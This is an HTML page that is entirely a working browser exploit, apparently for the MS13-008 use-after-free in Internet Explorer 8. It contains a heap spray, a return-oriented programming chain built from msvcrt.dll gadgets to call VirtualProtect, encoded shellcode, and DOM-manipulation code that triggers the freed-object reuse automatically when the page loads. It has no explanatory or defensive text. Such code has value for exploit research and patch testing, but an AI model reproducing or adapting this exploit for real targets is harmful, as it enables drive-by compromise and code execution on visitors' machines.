<!doctype html>
<html>
<head>
<script>

var sprayblocks = new Array();

function prepare_payload()
{
	var add_esp_gadget = unescape("%udca8%u77c4");  //0x77c4dca8 :  # (ADD ESP,2C # RETN) -- msvcrt.dll
	var tmp_pad = unescape("%u4141");
	var i = 0;
	var pad = add_esp_gadget
	while (pad.length < 0xDC/2) { // in eax+0xDC+post_pad.length = xchg eax, esp; ret. eax = 0x0c0c0c0c
		pad += tmp_pad;
		i = i + 2;
		if ( i == 0x2C) {
			i = 0;
			pad += add_esp_gadget;
		}
	}
	post_pad = "";
	i = 0;
	while ( i != 16/2) { // extra padding to adjust the stack pivot gadgets
		post_pad += tmp_pad;
		i = i + 1;
	}
	var heap_pivot = unescape("%ua891%u77c3"); //0x77c3a891 : # XCHG EAX,ESP # RETN  -- msvcrt.dll
	var pre_stage = pad + heap_pivot + post_pad;
	var rop_chain = unescape(
    "%u71cc%u77c3" + // 0x77c371cc : ,# POP EBP # RETN [msvcrt.dll] 
    "%u71cc%u77c3" + // 0x77c371cc : ,# skip 4 bytes [msvcrt.dll]
    "%ua512%u77c3" + // 0x77c3a512 : ,# POP EBX # RETN [msvcrt.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u0d0c%u77c5" + // 0x77c50d0c : ,# POP EDX # RETN [msvcrt.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%ud408%u77c2" + // 0x77c2d408 : ,# POP ECX # RETN [msvcrt.dll] 
    "%u3450%u77c6" + // 0x77c63450 : ,# &Writable location [msvcrt.dll]
    "%u7cde%u77c4" + // 0x77c47cde : ,# POP EDI # RETN [msvcrt.dll] 
    "%u6101%u77c4" + // 0x77c46101 : ,# RETN (ROP NOP) [msvcrt.dll]
    "%ub104%u77c2" + // 0x77c2b104 : ,# POP ESI # RETN [msvcrt.dll] 
    "%uaacc%u77c2" + // 0x77c2aacc : ,# JMP [EAX] [msvcrt.dll]
    "%u2217%u77c5" + // 0x77c52217 : ,# POP EAX # RETN [msvcrt.dll] 
    "%u1120%u77c1" + // 0x77c11120 : ,# ptr to &VirtualProtect() [IAT msvcrt.dll]
    "%u2df9%u77c1" + // 0x77c12df9 : ,# PUSHAD # RETN [msvcrt.dll] 
    "%u5459%u77c3" + // 0x77c35459 : ,# ptr to 'push esp # ret ' [msvcrt.dll]
    ""); //  : 
	var shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063");
	
	return pre_stage + rop_chain + shellcode
}

function ie8_precise_spray()
{
	payload = prepare_payload()
	
	var beginning = unescape("TEST")
	var junk_start = unescape("%u2020%u2020");
	var junk_end = unescape("%u3030%u3030");
	
	// create large chunk (it's stored in heap, but doesn't matter here). Length doesn't matter.
	while (beginning.length < 0x4000) beginning += junk_start;
	while (junk_end.length < 0x4000) junk_end += junk_end;
	
	// add the padding from block start to our payload (it has to be computed depending on where you jump) 
	offset = ((0x7C0 - 4) / 2); // correct offset. Jumping to 0x08080808
	var junk_front = beginning.substring(0, offset);
	
	// construct one block of 0x2000 bytes
	var junk_end = junk_end.substring(0, 0x2000 - junk_front.length - payload.length)
	var smallblock = junk_front + payload + junk_end;
	//                            ^
	//                            |
	//    0x08080808 -------------+

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x8000) { largeblock = largeblock + smallblock; }

	// allocate 0x5000 times
	for (i = 0; i < 0x5000; i++) { sprayblocks[i] = largeblock.substring(0, ((0x8000-6)/2)-8);	}
	
	/*
	var junk = unescape("%u2020%u2020");
	while (junk.length < 0x4000) junk += junk;
	// construct one block of 0x800 bytes
	offset = 0x5F4;
	var junk_front = junk.substring(0,offset);
	var junk_end = junk.substring(0,0x800 - junk_front.length - pre_stage.length - rop_chain.length - shellcode.length)
	var smallblock = junk_front + payload + junk_end;
	//                            ^
	//                            |
	//    0x08080808 -------------+

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x80000) { largeblock = largeblock + smallblock; }

	// allocate 0x450 times
	for (i = 0; i < 0x450; i++) { sprayblocks[i] = largeblock.substring(0, (0x7fb00-6)/2);	}
	*/
}

function xpl() {

	ie8_precise_spray()

	// Exploit for MS13-008
	
	var e0 = null;
	var e1 = null;
	var e2 = null;

	try {
		e0 = document.getElementById("a");
		e1 = document.getElementById("b");
		e2 = document.createElement("q");
		e1.applyElement(e2);
		e1.appendChild(document.createElement('button'));
		e1.applyElement(e0);
		e2.outerText = "";
		e2.appendChild(document.createElement('body'));
	} catch(e) { }
	CollectGarbage();
	divobj = document.createElement('div');
	// 86 bytes ( + terminating nulls gets added automatically)
	// Total size: 88 bytes (0x58)
	// eax = 0x08080808
	divobj.className = "\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808\u0808" +
    "\u0808\u0808\u0808\u0808\u0808\u0808";
}

</script>
</head>
<body onload="eval(xpl())">
	<form id="a">
	</form>
	<dfn id="b">
	</dfn>
</body>
</html>